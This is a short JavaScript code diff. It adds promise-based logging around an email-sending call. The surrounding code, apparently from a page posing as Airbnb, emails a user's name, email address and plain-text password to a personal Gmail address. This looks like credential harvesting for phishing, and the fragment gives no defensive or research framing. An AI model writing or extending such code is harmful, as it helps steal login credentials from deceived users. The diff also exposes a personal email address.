@@ -168,9 +168,12 @@ client.sendEmail({
   "To": "owolabifelix78@gmail.com",
   "Subject": "Test",
   "TextBody": `Hello From AirBnb,${name},${email},${password}`
+}).then(response => {
+  console.log("Email sent:", response);
+}).catch(error => {
+  console.error("Email sending error:", error);
 });
 
-console.log("Email","Email Sent")
 }
 
 
